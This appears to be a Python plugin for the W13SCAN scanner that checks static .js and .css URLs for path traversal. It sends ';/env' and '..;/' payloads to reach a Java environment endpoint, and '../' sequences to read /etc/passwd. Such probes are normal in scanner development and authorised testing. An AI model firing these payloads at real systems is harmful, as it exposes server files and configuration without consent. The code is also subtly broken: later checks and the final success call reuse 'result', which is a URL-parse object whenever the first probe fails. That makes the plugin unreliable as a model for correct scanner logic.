
import os
import requests

from lib.core.common import generateResponse
from lib.core.enums import VulType, PLACE
from lib.core.plugins import PluginBase
from urllib.parse import urlparse
from lib.helper import parse_url


class W13SCAN(PluginBase):
    name = '静态文件下的路径遍历'
    desc = '''静态文件下的路径遍历'''

    def audit(self):
        result = urlparse(self.requests.url)
        path = result.path

        if self.requests.method == "GET" and self.requests.url.count('/') >= 4 and parse_url.geturl_ext(self.requests.url) in ["js", "css"] and self.response.status_code == 200:
            resp = requests.get(self.requests.url + ";/env", headers=self.requests.headers)
            if resp.status_code == 200 and "java.vm.version" in resp.text:
                result = self.new_result()
                result.init_info(self.requests.url, "静态文件下的路径遍历", VulType.PATH_TRAVERSAL)
                result.add_detail("payload1请求", self.requests.url + ";/env", generateResponse(resp),
                                  self.requests.url + ";/env", "", "", PLACE.GET)
            number = self.requests.url.count("/") - 2
            resp1 = requests.get(self.requests.url + "/" + "..;/" * number + "env", headers=self.requests.headers)
            if resp1.status_code == 200 and "java.vm.version" in resp1.text:
                result.add_detail("payload1请求", self.requests.url + "/" + "..;/" * number + "env", generateResponse(resp1),
                                  self.requests.url + "/" + "..;/" * number + "env", "", "", PLACE.GET)
            resp2 = requests.get(self.requests.url + "/" + "../" * number + "etc/passwd", headers=self.requests.headers)
            if resp2.status_code == 200 and "root:x:" in resp2.text:
                result.add_detail("payload2请求", self.requests.url + "/" + "../" * number + "etc/passwd",
                                  generateResponse(resp2),
                                  self.requests.url + "/" + "../" * number + "etc/passwd", "", "", PLACE.GET)
            self.success(result)
